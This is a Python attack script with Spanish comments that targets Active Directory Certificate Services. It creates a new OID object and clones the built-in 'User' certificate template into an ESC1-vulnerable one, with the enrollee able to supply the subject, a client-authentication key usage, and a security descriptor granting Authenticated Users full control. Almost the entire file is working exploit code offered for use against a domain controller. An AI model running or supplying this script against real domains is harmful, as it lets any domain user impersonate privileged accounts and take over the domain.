#!/usr/bin/env python3
"""
AD CS ESC1 - Clonar Template de Certificado - Clona el template 'User' en
uno nuevo con enrollee-supplies-subject habilitado (ESC1), crea el objeto
OID requerido y configura ACLs permisivas para enrollment.

Requiere: ldap3, impacket
Uso: python3 adcs-clone-template.py <DC_IP> <dominio> <usuario> <password> <nombre_template>
"""
import sys, ssl, random
from ldap3 import Server, Connection, Tls, ALL, SUBTREE
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, ACL, ACCESS_ALLOWED_ACE, ACE, LDAP_SID, ACCESS_MASK

dc, dom, user, pw, NAME = sys.argv[1:6]
base = ','.join('DC=' + p for p in dom.split('.'))
tc = f'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{base}'
oc = f'CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,{base}'
newdn = f'CN={NAME},{tc}'

AUTHENTICATED_USERS = 'S-1-5-11'
OWNER_SID = sys.argv[6] if len(sys.argv) > 6 else AUTHENTICATED_USERS

tls = Tls(validate=ssl.CERT_NONE)
c = Connection(Server(dc, use_ssl=True, tls=tls, get_info=ALL),
               user=f'{dom}\\{user}', password=pw,
               authentication='NTLM', auto_bind=True)
print('[+] bound')

c.search(oc, '(objectClass=msPKI-Enterprise-Oid)', SUBTREE,
         attributes=['msPKI-Cert-Template-OID'])
boid = None
for e in c.entries:
    v = e['msPKI-Cert-Template-OID'].value
    if v:
        boid = '.'.join(str(v).split('.')[:-1])
        break
noid = boid + '.' + str(random.randint(1000000, 99999999))
ocn = str(random.randint(10000000, 99999999)) + '.' + ''.join(
    random.choice('ABCDEF0123456789') for _ in range(32))

c.add(f'CN={ocn},{oc}', attributes={
    'objectClass': ['top', 'msPKI-Enterprise-Oid'],
    'displayName': [NAME], 'flags': [1],
    'msPKI-Cert-Template-OID': [noid],
})
print('[i] OID:', noid, '::', 'ok' if c.result['result'] == 0 else c.result['description'])

c.search(tc, '(cn=User)', SUBTREE, attributes=['*'])
u = c.entries[0].entry_attributes_as_dict
skip = {'objectClass', 'cn', 'distinguishedName', 'name', 'whenCreated',
        'whenChanged', 'uSNCreated', 'uSNChanged', 'objectGUID',
        'dSCorePropagationData', 'instanceType', 'objectCategory',
        'showInAdvancedViewOnly', 'nTSecurityDescriptor',
        'msPKI-Cert-Template-OID', 'displayName', 'revision'}
attrs = {
    'objectClass': ['top', 'pKICertificateTemplate'],
    'displayName': [NAME], 'revision': [100],
    'msPKI-Cert-Template-OID': [noid],
}
for k, v in u.items():
    if k not in skip:
        attrs[k] = v

attrs['msPKI-Certificate-Name-Flag'] = [1]
attrs['msPKI-Enrollment-Flag'] = [0]
attrs['pKIExtendedKeyUsage'] = ['1.3.6.1.5.5.7.3.2']
attrs['msPKI-Certificate-Application-Policy'] = ['1.3.6.1.5.5.7.3.2']


def ace(sid):
    a = ACE()
    a['AceType'] = ACCESS_ALLOWED_ACE.ACE_TYPE
    a['AceFlags'] = 0
    inn = ACCESS_ALLOWED_ACE()
    m = ACCESS_MASK()
    m['Mask'] = 0x10000000
    inn['Mask'] = m
    s = LDAP_SID()
    s.fromCanonical(sid)
    inn['Sid'] = s
    a['Ace'] = inn
    return a


sd = SR_SECURITY_DESCRIPTOR()
sd['Revision'] = b'\x01'
sd['Sbz1'] = b'\x00'
sd['Control'] = 0x8004
o = LDAP_SID()
o.fromCanonical(OWNER_SID)
sd['OwnerSid'] = o
sd['GroupSid'] = o
sd['Sacl'] = b''
acl = ACL()
acl['AclRevision'] = 4
acl['Sbz1'] = 0
acl['Sbz2'] = 0
acl.aces = [ace(AUTHENTICATED_USERS), ace(OWNER_SID)]
sd['Dacl'] = acl
attrs['nTSecurityDescriptor'] = [sd.getData()]

print('[+] template cloned' if c.add(newdn, attributes=attrs)
      else '[-] add: ' + str(c.result))
